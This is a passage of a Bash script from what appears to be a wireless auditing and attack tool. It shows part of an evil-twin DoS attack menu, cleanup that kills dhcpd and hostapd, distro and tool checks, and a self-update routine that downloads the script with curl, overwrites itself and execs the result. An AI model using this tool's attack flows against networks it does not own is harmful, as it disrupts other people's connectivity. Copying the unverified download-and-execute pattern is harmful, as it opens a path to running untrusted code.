				detect_internet_interface
				if [ "$?" = "0" ]; then
					et_prerequisites
				else
					return
				fi
			fi
		;;
		3)
			contains_element "$et_dos_option" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				et_dos_attack="Wds Confusion"
				detect_internet_interface
				if [ "$?" = "0" ]; then
					et_prerequisites
				else
					return
				fi
			fi
		;;
		4)
			return
		;;
		*)
			invalid_menu_option
		;;
	esac

	et_dos_menu
}

function detect_internet_interface() {

	if [ -n "$internet_interface" ]; then
		echo
		language_strings ${language} 285 "blue"
		ask_yesno 284
		if [ ${yesno} = "n" ]; then
			select_internet_interface
		fi
	else
		select_internet_interface
	fi

	validate_et_internet_interface
	return $?
}

function credits_option() {

	clear
	language_strings ${language} 105 "title"
	language_strings ${language} 74 "pink"
	echo
	language_strings ${language} 73 "blue"
	echo
	echo -e ${green_color}"                                                            .-\"\"\"\"-."
	sleep 0.15 && echo -e "                                                           /        \ "
	sleep 0.15 && echo -e ${yellow_color}"         ____        ____  __   _______                  "${green_color}" /_        _\ "
	sleep 0.15 && echo -e ${yellow_color}"  ___  _/_   | _____/_   |/  |_ \   _  \_______         "${green_color}" // \      / \\\\\ "
	sleep 0.15 && echo -e ${yellow_color}"  \  \/ /|   |/  ___/|   \   __\/  /_\  \_  __ \        "${green_color}" |\__\    /__/|"
	sleep 0.15 && echo -e ${yellow_color}"   \   / |   |\___ \ |   ||  |  \  \_/   \  | \/         "${green_color}" \    ||    /"
	sleep 0.15 && echo -e ${yellow_color}"    \_/  |___/____  >|___||__|   \_____  /__|             "${green_color}" \        /"
	sleep 0.15 && echo -e ${yellow_color}"                  \/                   \/                  "${green_color}" \  __  / "
	sleep 0.15 && echo -e "                                                             '.__.'"
	sleep 0.15 && echo -e "                                                              |  |"${normal_color}
	echo
	language_strings ${language} 75 "blue"
	echo
	language_strings ${language} 85 "pink"
	language_strings ${language} 107 "pink"
	language_strings ${language} 115 "read"
}

function invalid_language_selected() {

	echo
	language_strings ${language} 82 "yellow"
	echo
	language_strings ${language} 115 "read"
	echo
	language_menu
}

function forbidden_menu_option() {

	echo
	language_strings ${language} 220 "yellow"
	language_strings ${language} 115 "read"
}

function invalid_menu_option() {

	echo
	language_strings ${language} 76 "yellow"
	language_strings ${language} 115 "read"
}

function invalid_iface_selected() {

	echo
	language_strings ${language} 77 "yellow"
	echo
	language_strings ${language} 115 "read"
	echo
	select_interface
}

function invalid_internet_iface_selected() {

	echo
	language_strings ${language} 77 "yellow"
	echo
	language_strings ${language} 115 "read"
	echo
	select_internet_interface
}

function capture_traps() {

	case ${current_menu} in
		"pre_main_menu"|"select_interface_menu")
			exit_code=1
			exit_script_option
		;;
		*)
			ask_yesno 12
			if [ ${yesno} = "y" ]; then
				exit_code=1
				exit_script_option
			else
				language_strings ${language} 224 "blue"
				if [ ${last_buffered_type1} = "read" ]; then
					language_strings ${language} ${last_buffered_message2} ${last_buffered_type2}
				else
					language_strings ${language} ${last_buffered_message1} ${last_buffered_type1}
				fi
			fi
		;;
	esac
}

function exit_script_option() {

	action_on_exit_taken=0
	echo
	language_strings ${language} 106 "title"
	language_strings ${language} 11 "blue"

	echo
	language_strings ${language} 165 "blue"

	if [ "$ifacemode" = "Monitor" ]; then
		ask_yesno 166
		if [ ${yesno} = "n" ]; then
			action_on_exit_taken=1
			language_strings ${language} 167 "multiline"
			${airmon} stop ${interface} > /dev/null 2>&1
			time_loop
			echo -e ${green_color}" Ok\r"${normal_color}
		fi
	fi

	if [ ${nm_processes_killed} -eq 1 ]; then
		action_on_exit_taken=1
		language_strings ${language} 168 "multiline"
		eval ${networkmanager_cmd}" > /dev/null 2>&1"
		time_loop
		echo -e ${green_color}" Ok\r"${normal_color}
	fi

	if [ ${tmpfiles_toclean} -eq 1 ]; then
		action_on_exit_taken=1
		language_strings ${language} 164 "multiline"
		clean_tmpfiles
		time_loop
		echo -e ${green_color}" Ok\r"${normal_color}
	fi

	if [ ${routing_toclean} -eq 1 ]; then
		action_on_exit_taken=1
		language_strings ${language} 297 "multiline"
		clean_routing_rules
		killall dhcpd > /dev/null 2>&1
		killall hostapd > /dev/null 2>&1
		time_loop
		echo -e ${green_color}" Ok\r"${normal_color}
	fi

	if [ ${action_on_exit_taken} -eq 0 ]; then
		language_strings ${language} 160 "yellow"
	fi

	echo
	exit ${exit_code}
}

function time_loop() {

	echo -ne " "
	for j in `seq 1 4`; do
		echo -ne "."
		sleep 0.035
	done
}

function airmon_fix() {

	airmon="airmon-ng"

	if hash airmon-zc 2> /dev/null; then
		airmon="airmon-zc"
	fi
}

function iwconfig_fix() {

	iwversion=`iwconfig --version | grep version | awk '{print $4}'`
	iwcmdfix=""
	if [ ${iwversion} -lt 30 ]; then
		iwcmdfix=" 2> /dev/null | grep Mode: "
	fi
}

function non_linux_os_check() {

	case "$OSTYPE" in
		solaris*)
			distro="Solaris"
		;;
		darwin*)
			distro="Mac OSX"
		;;
		bsd*)
			distro="FreeBSD"
		;;
	esac
}

function detect_distro_phase1() {

	for i in "${known_compatible_distros[@]}"; do
		uname -a | grep "$i" -i > /dev/null
		if [ "$?" = "0" ]; then
			distro="${i^}"
			break
		fi
	done
}

function detect_distro_phase2() {

	if [ "$distro" = "Kali" ]; then
		uname -m | grep "arm" > /dev/null
		if [ "$?" = "0" ]; then
			distro="Kali arm"
		fi
	fi

	if [ "$distro" = "Unknown Linux" ]; then
		if [ -f ${osversionfile_dir}"centos-release" ]; then
			distro="CentOS"
		elif [ -f ${osversionfile_dir}"fedora-release" ]; then
			distro="Fedora"
		elif [ -f ${osversionfile_dir}"gentoo-release" ]; then
			distro="Gentoo"
		elif [ -f ${osversionfile_dir}"openmandriva-release" ]; then
			distro="OpenMandriva"
		elif [ -f ${osversionfile_dir}"redhat-release" ]; then
			distro="Red Hat"
		elif [ -f ${osversionfile_dir}"SuSE-release" ]; then
			distro="SuSE"
		elif [ -f ${osversionfile_dir}"debian_version" ]; then
			distro="Debian"
			if [ -f ${osversionfile_dir}"os-release" ]; then
				is_raspbian=$(cat ${osversionfile_dir}"os-release" | grep "PRETTY_NAME")
				if [[ "$is_raspbian" =~ Raspbian ]];then
					distro="Raspbian"
				fi
			fi
		fi
	fi
}

function special_distro_features() {

	case ${distro} in
		"Wifislax")
			networkmanager_cmd="service restart networkmanager"
			xratio=7
			yratio=15.1
			ywindow_edge_lines=1
			ywindow_edge_pixels=-14
		;;
		"Backbox")
			networkmanager_cmd="service network-manager restart"
			xratio=6
			yratio=14.2
			ywindow_edge_lines=1
			ywindow_edge_pixels=15
		;;
		"Ubuntu")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=18
		;;
		"Kali"|"Kali arm")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=18
		;;
		"Debian")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=14
		;;
		"SuSE")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=18
		;;
		"CentOS")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6.2
			yratio=14.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=10
		;;
		"Parrot")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=10
		;;
		"Arch")
			networkmanager_cmd="systemctl restart NetworkManager.service"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=16
		;;
		"Fedora")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6
			yratio=14.1
			ywindow_edge_lines=2
			ywindow_edge_pixels=16
		;;
		"Gentoo")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6.2
			yratio=14.6
			ywindow_edge_lines=1
			ywindow_edge_pixels=-10
		;;
		"Red Hat")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6.2
			yratio=15.3
			ywindow_edge_lines=1
			ywindow_edge_pixels=10
		;;
		"Cyborg")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=14.5
			ywindow_edge_lines=2
			ywindow_edge_pixels=10
		;;
		"Blackarch")
			networkmanager_cmd="systemctl restart NetworkManager.service"
			xratio=7.3
			yratio=14
			ywindow_edge_lines=1
			ywindow_edge_pixels=1
		;;
		"Raspbian")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=14
			ywindow_edge_lines=1
			ywindow_edge_pixels=20
		;;
		"OpenMandriva")
			networkmanager_cmd="systemctl restart NetworkManager.service"
			xratio=6.2
			yratio=14
			ywindow_edge_lines=2
			ywindow_edge_pixels=-10
		;;
	esac
}

function check_if_kill_needed() {

	nm_min_main_version="1"
	nm_min_subversion="0"
	nm_min_subversion2="12"

	if ! hash NetworkManager 2> /dev/null; then
		check_kill_needed=0
	else
		nm_system_version=$(NetworkManager --version 2> /dev/null)

		if [ "$nm_system_version" != "" ]; then

			[[ ${nm_system_version} =~ ^([0-9]{1,2})\.([0-9]{1,2})\.([0-9]+).*?$ ]] && nm_main_system_version="${BASH_REMATCH[1]}" && nm_system_subversion="${BASH_REMATCH[2]}" && nm_system_subversion2="${BASH_REMATCH[3]}"

			if [ ${nm_main_system_version} -lt ${nm_min_main_version} ]; then
				check_kill_needed=1
			elif [ ${nm_main_system_version} -eq ${nm_min_main_version} ]; then

				if [ ${nm_system_subversion} -lt ${nm_min_subversion} ]; then
					check_kill_needed=1
				elif [  ${nm_system_subversion} -eq ${nm_min_subversion} ]; then

					if [ ${nm_system_subversion2} -lt ${nm_min_subversion2} ]; then
						check_kill_needed=1
					fi
				fi
			fi
		else
			check_kill_needed=1
		fi
	fi
}

function general_checkings() {

	compatible=0
	distro="Unknown Linux"

	detect_distro_phase1
	detect_distro_phase2
	special_distro_features
	check_if_kill_needed

	if [ "$distro" = "Unknown Linux" ]; then
		non_linux_os_check
		echo -e ${yellow_color}"$distro"${normal_color}
	else
		echo -e ${yellow_color}"$distro Linux"${normal_color}
	fi

	check_compatibility
	if [ ${compatible} -eq 1 ]; then
		return
	fi

	check_root_permissions

	language_strings ${language} 115 "read"
	exit_code=1
	exit_script_option
}

function check_root_permissions() {

	user=`whoami`

	if [ "$user" != "root" ]; then
		language_strings ${language} 223 "yellow"
	fi
}

function print_known_distros() {

	for i in "${known_compatible_distros[@]}"; do
		echo -ne ${pink_color}"\"${i}\" "${normal_color}
	done
	echo
}

function check_compatibility() {

	echo
	language_strings ${language} 108 "blue"
	language_strings ${language} 115 "read"

	echo
	language_strings ${language} 109 "blue"

	essential_toolsok=1
	for i in "${essential_tools_names[@]}"; do
		echo -ne "$i"
		time_loop
		if ! hash ${i} 2> /dev/null; then
			echo -ne ${red_color}" Error"${normal_color}
			essential_toolsok=0
			echo -ne " (${possible_package_names[$language]} : ${possible_package_names[$i]})"
			echo -e "\r"
		else
			echo -e ${green_color}" Ok\r"${normal_color}
		fi
	done

	echo
	language_strings ${language} 218 "blue"

	optional_toolsok=1
	for i in "${!optional_tools[@]}"; do
		echo -ne "$i"
		time_loop
		if ! hash ${i} 2> /dev/null; then
			echo -ne ${red_color}" Error"${normal_color}
			optional_toolsok=0
			echo -ne " (${possible_package_names[$language]} : ${possible_package_names[$i]})"
			echo -e "\r"
		else
			echo -e ${green_color}" Ok\r"${normal_color}
			optional_tools[$i]=1
		fi
	done

	update_toolsok=1
	if [ ${auto_update} -eq 1 ]; then

		echo
		language_strings ${language} 226 "blue"

		for i in "${update_tools[@]}"; do
			echo -ne "$i"
			time_loop
			if ! hash ${i} 2> /dev/null; then
				echo -ne ${red_color}" Error"${normal_color}
				update_toolsok=0
				echo -ne " (${possible_package_names[$language]} : ${possible_package_names[$i]})"
				echo -e "\r"
			else
				echo -e ${green_color}" Ok\r"${normal_color}
			fi
		done
	fi

	if [ ${essential_toolsok} -eq 0 ]; then
		echo
		language_strings ${language} 111 "yellow"
		echo
		return
	fi

	compatible=1

	if [ ${optional_toolsok} -eq 0 ]; then
		echo
		language_strings ${language} 219 "yellow"
		echo
		return
	fi

	echo
	language_strings ${language} 110 "yellow"
}

function check_bash_version() {

	echo
	bashversion="${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"
	if compare_floats_greater_or_equal ${bashversion} ${minimum_bash_version_required}; then
		language_strings ${language} 221 "yellow"
	else
		language_strings ${language} 222 "yellow"
		exit_code=1
		exit_script_option
	fi
}

function check_update_tools() {

	if [ ${auto_update} -eq 1 ]; then
		if [ ${update_toolsok} -eq 1 ]; then
			autoupdate_check
		else
			echo
			language_strings ${language} 225 "yellow"
			language_strings ${language} 115 "read"
		fi
	fi
}

function print_intro() {

	echo -e ${yellow_color}"                  .__                         .___  .___"
	sleep 0.15 && echo -e "           _____  |__|______  ____   ____   __| _/__| _/____   ____"
	sleep 0.15 && echo -e "           \__  \ |  \_  __ \/ ___\_/ __ \ / __ |/ __ |/  _ \ /    \\"
	sleep 0.15 && echo -e "            / __ \|  ||  | \/ /_/  >  ___// /_/ / /_/ (  <_> )   |  \\"
	sleep 0.15 && echo -e "           (____  /__||__|  \___  / \___  >____ \____ |\____/|___|  /"
	sleep 0.15 && echo -e "                \/         /_____/      \/     \/    \/           \/"${normal_color}
	echo
	language_strings ${language} 228 "green"
	print_animated_flying_saucer
	sleep 1
}

function flying_saucer() {

	case $1 in
		1)
			echo "                                                             "
			echo "                         .   *       _.---._  *              "
			echo "                                   .'       '.       .       "
			echo "                               _.-~===========~-._          *"
			echo "                           *  (___________________)     .    "
			echo "                       .     .      \_______/    *           "
		;;
		2)
			echo "                        *         .  _.---._          .      "
			echo "                              *    .'       '.  .            "
			echo "                               _.-~===========~-._ *         "
			echo "                           .  (___________________)       *  "
			echo "                            *       \_______/        .       "
			echo "                                                             "
		;;
		3)
			echo "                                   *                .        "
			echo "                             *       _.---._              *  "
			echo "                          .        .'       '.       *       "
			echo "                       .       _.-~===========~-._     *     "
			echo "                              (___________________)         ."
			echo "                       *            \_______/ .              "
		;;
		4)
			echo "                        *         .  _.---._          .      "
			echo "                              *    .'       '.  .            "
			echo "                               _.-~===========~-._ *         "
			echo "                           .  (___________________)       *  "
			echo "                            *       \_______/        .       "
			echo "                                                             "
		;;
	esac
	sleep 0.4
}

function print_animated_flying_saucer() {

	echo -e "\033[s"

	for i in `seq 1 8`; do
		if [ ${i} -le 4 ]; then
			saucer_frame=${i}
		else
			saucer_frame=$(($i-4))
		fi
		echo -e "\033[u"
		flying_saucer ${saucer_frame}
	done
}

function initialize_script_settings() {

	exit_code=0
	check_kill_needed=0
	nm_processes_killed=0
	airmon_fix
	autochanged_language=0
	tmpfiles_toclean=0
	routing_toclean=0
	screen_correction_needed=0
	dhcpd_path_changed=0
	xratio=6.2
	yratio=13.9
	ywindow_edge_lines=2
	ywindow_edge_pixels=18
	networkmanager_cmd="service network-manager restart"
}

function detect_screen_resolution() {

	resolution_detected=0
	if hash xdpyinfo 2> /dev/null; then
		resolution=$(xdpyinfo | grep -A 3 "screen #0" | grep "dimensions" | tr -s " " | cut -d " " -f 3 | grep "x")

		if [ "$?" = "0" ]; then
			resolution_detected=1
		fi
	fi

	if [ ${resolution_detected} -eq 0 ]; then
		resolution=${standard_resolution}
	fi

	[[ ${resolution} =~ ^([0-9]{3,4})x(([0-9]{3,4}))$ ]] && resolution_x="${BASH_REMATCH[1]}" && resolution_y="${BASH_REMATCH[2]}"
}

function set_windows_sizes() {

	set_xsizes
	set_ysizes
	set_ypositions

	g1_topleft_window="${xwindow}x${ywindowhalf}+0+0"
	g1_bottomleft_window="${xwindow}x${ywindowhalf}+0-0"
	g1_topright_window="${xwindow}x${ywindowhalf}-0+0"
	g1_bottomright_window="${xwindow}x${ywindowhalf}-0-0"

	g2_stdleft_window="${xwindow}x${ywindowone}+0+0"
	g2_stdright_window="${xwindow}x${ywindowone}-0+0"

	g3_topleft_window="${xwindow}x${ywindowthird}+0+0"
	g3_middleleft_window="${xwindow}x${ywindowthird}+0+${middle_position}"
	g3_bottomleft_window="${xwindow}x${ywindowthird}+0-0"
	g3_topright_window="${xwindow}x${ywindowhalf}-0+0"
	g3_bottomright_window="${xwindow}x${ywindowhalf}-0-0"

	g4_topleft_window="${xwindow}x${ywindowthird}+0+0"
	g4_middleleft_window="${xwindow}x${ywindowthird}+0+${middle_position}"
	g4_bottomleft_window="${xwindow}${ywindowthird}+0-0"
	g4_topright_window="${xwindow}x${ywindowthird}-0+0"
	g4_middleright_window="${xwindow}x${ywindowthird}-0+${middle_position}"
	g4_bottomright_window="${xwindow}x${ywindowthird}-0-0"
}

function set_xsizes() {

	xtotal=$(awk -v n1=${resolution_x} "BEGIN{print n1 / $xratio}")

	xtotaltmp=$(printf "%.0f" ${xtotal} 2> /dev/null)
	if [ "$?" != "0" ]; then
		dec_char=","
		xtotal="${xtotal/./$dec_char}"
		xtotal=$(printf "%.0f" ${xtotal} 2> /dev/null)
	else
		xtotal=${xtotaltmp}
	fi

	xcentral_space=$(($xtotal * 5 / 100))
	xhalf=$(($xtotal / 2))
	xwindow=$(($xhalf - $xcentral_space))
}

function set_ysizes() {

	ytotal=$(awk -v n1=${resolution_y} "BEGIN{print n1 / $yratio}")
	ytotaltmp=$(printf "%.0f" ${ytotal} 2> /dev/null)
	if [ "$?" != "0" ]; then
		dec_char=","
		ytotal="${ytotal/./$dec_char}"
		ytotal=$(printf "%.0f" ${ytotal} 2> /dev/null)
	else
		ytotal=${ytotaltmp}
	fi

	ywindowone=$(($ytotal - $ywindow_edge_lines))
	ywindowhalf=$(($ytotal / 2 - $ywindow_edge_lines))
	ywindowthird=$(($ytotal / 3 - $ywindow_edge_lines))
}

function set_ypositions() {

	middle_position=$(($resolution_y / 3 + $ywindow_edge_pixels))
}

function recalculate_windows_sizes() {

	detect_screen_resolution
	set_windows_sizes
}

function welcome() {

	clear
	current_menu="pre_main_menu"
	initialize_script_settings

	if [ ${auto_change_language} -eq 1 ]; then
		autodetect_language
	fi

	detect_screen_resolution

	if [ ${debug_mode} -eq 0 ]; then
		language_strings ${language} 86 "title"
		language_strings ${language} 6 "blue"
		echo
		print_intro

		clear
		language_strings ${language} 86 "title"
		language_strings ${language} 7 "pink"
		language_strings ${language} 114 "pink"

		if [ ${autochanged_language} -eq 1 ]; then
			echo
			language_strings ${language} 2 "yellow"
		fi

		check_bash_version

		echo
		if [ ${resolution_detected} -eq 1 ]; then
			language_strings ${language} 294 "blue"
		else
			language_strings ${language} 295 "blue"
			echo
			language_strings ${language} 300 "yellow"
		fi

		echo
		language_strings ${language} 8 "blue"
		print_known_distros
		echo
		language_strings ${language} 9 "blue"
		general_checkings
		language_strings ${language} 115 "read"

		airmonzc_security_check
		check_update_tools
	fi

	set_windows_sizes
	select_interface
	initialize_menu_options_dependencies
	main_menu
}

function airmonzc_security_check() {

	if [ "$airmon" = "airmon-zc" ]; then
		if ! hash ethtool 2> /dev/null; then
			echo
			language_strings ${language} 247 "yellow"
			echo
			language_strings ${language} 115 "read"
			exit_code=1
			exit_script_option
		elif ! hash lspci 2> /dev/null; then
			echo
			language_strings ${language} 301 "yellow"
			echo
			language_strings ${language} 115 "read"
			exit_code=1
			exit_script_option
		fi
	fi
}

function compare_floats_greater_than() {

	awk -v n1=$1 -v n2=$2 'BEGIN{if (n1>n2) exit 0; exit 1}'
}

function compare_floats_greater_or_equal() {

	awk -v n1=$1 -v n2=$2 'BEGIN{if (n1>=n2) exit 0; exit 1}'
}

function download_last_version() {

	curl -L ${urlscript_directlink} -s -o $0

	if [ "$?" = "0" ]; then
		echo
		language_strings ${language} 214 "yellow"

		scriptpath=$0
		if ! [[ $0 =~ ^/.*$ ]]; then
			if ! [[ $0 =~ ^.*/.*$ ]]; then
				scriptpath="./$0"
			fi
		fi

		chmod +x ${scriptpath} > /dev/null 2>&1
		language_strings ${language} 115 "read"
		exec ${scriptpath}
	else
		language_strings ${language} 5 "yellow"
	fi
}

function validate_et_internet_interface() {

	echo
	language_strings ${language} 287 "blue"
	check_internet_access ${host_to_check_internet}

	if [ "$?" != "0" ]; then
		echo
		language_strings ${language} 288 "yellow"
		language_strings ${language} 115 "read"
		return 1
	fi

	check_default_route ${internet_interface}
	if [ "$?" != "0" ]; then
		echo
		language_strings ${language} 290 "yellow"
		language_strings ${language} 115 "read"
		return 1
	fi

	echo
	language_strings ${language} 289 "yellow"
	language_strings ${language} 115 "read"
	return 0
}

function check_internet_access() {

	ping -c 1 ${host_to_check_internet} -W 1 > /dev/null 2>&1
	return $?
}

function check_default_route() {

	route | grep ${1} | grep "default" > /dev/null
	return $?
}

function autoupdate_check() {

	echo
	language_strings ${language} 210 "blue"
	echo
	hasinternet_access_for_update=0

	check_internet_access ${host_to_check_internet}
	if [ "$?" = "0" ]; then
		hasinternet_access_for_update=1
	fi

	if [ ${hasinternet_access_for_update} -eq 1 ]; then

		airgeddon_last_version=`timeout -s SIGTERM 15 curl -L ${urlscript_directlink} 2> /dev/null | grep "airgeddon_version=" | head -1 | cut -d "\"" -f 2`

		if [ "$airgeddon_last_version" != "" ]; then
			if compare_floats_greater_than ${airgeddon_last_version} ${airgeddon_version}; then
				language_strings ${language} 213 "yellow"
				download_last_version
			else
				language_strings ${language} 212 "yellow"
			fi
		else
			language_strings ${language} 5 "yellow"
		fi
	else
		language_strings ${language} 211 "yellow"
	fi

	language_strings ${language} 115 "read"
}

function autodetect_language() {

	[[ $(locale | grep LANG) =~ ^(.*)=\"?([a-zA-Z]+)_(.*)$ ]] && lang="${BASH_REMATCH[2]}"

	for lgkey in "${!lang_association[@]}"; do
		if [[ "$lang" = "$lgkey" ]] && [[ "$language" != ${lang_association["$lgkey"]} ]]; then
			autochanged_language=1
			language=${lang_association["$lgkey"]}
			break
		fi
	done
}

function print_simple_separator() {

	echo_blue "---------"
}

function print_large_separator() {

	echo_blue "-------------------------------------------------------"
}

function check_pending_of_translation() {

	if [[ "$1" =~ ^$escaped_pending_of_translation([[:space:]])(.*)$ ]]; then
		text=${cyan_color}"$pending_of_translation "${2}"${BASH_REMATCH[2]}"
		return 1
	elif [[ "$1" =~ ^$escaped_hintvar[[:space:]](\\033\[[0-9];[0-9]{1,2}m)?($escaped_pending_of_translation)[[:space:]](.*) ]]; then
		text=${cyan_color}"$pending_of_translation "${brown_color}"$hintvar "${pink_color}"${BASH_REMATCH[3]}"
		return 1
	elif [[ "$1" =~ ^(\*+)[[:space:]]$escaped_pending_of_translation[[:space:]]([^\*]+)(\*+)$ ]]; then
		text=${2}"${BASH_REMATCH[1]}"${cyan_color}" $pending_of_translation "${2}"${BASH_REMATCH[2]}${BASH_REMATCH[3]}"
		return 1
	elif [[ "$1" =~ ^(\-+)[[:space:]]\($escaped_pending_of_translation[[:space:]]([^\-]+)(\-+)$ ]]; then
		text=${2}"${BASH_REMATCH[1]} ("${cyan_color}"$pending_of_translation "${2}"${BASH_REMATCH[2]}${BASH_REMATCH[3]}"
		return 1
	fi

	return 0
}

function under_construction_message() {

	local var_uc="${under_constructionvar^}"
	echo
	echo_yellow "$var_uc..."
	language_strings ${language} 115 "read"
}

function last_echo() {

	check_pending_of_translation "$1" ${2}
	if [ "$?" != "0" ]; then
		echo -e ${2}"$text"${normal_color}
	else
		echo -e ${2}"$*"${normal_color}
	fi
}

function echo_green() {

	last_echo "$1" ${green_color}
}

function echo_blue() {

	last_echo "$1" ${blue_color}
}

function echo_yellow() {

	last_echo "$1" ${yellow_color}
}

function echo_red() {

	last_echo "$1" ${red_color}
}

function echo_red_slim() {

	last_echo "$1" ${red_color_slim}
}

function echo_pink() {

	last_echo "$1" ${pink_color}
}

function echo_cyan() {

	last_echo "$1" ${cyan_color}
}

function echo_brown() {

	last_echo "$1" ${brown_color}
}

trap capture_traps INT
trap capture_traps SIGTSTP
welcome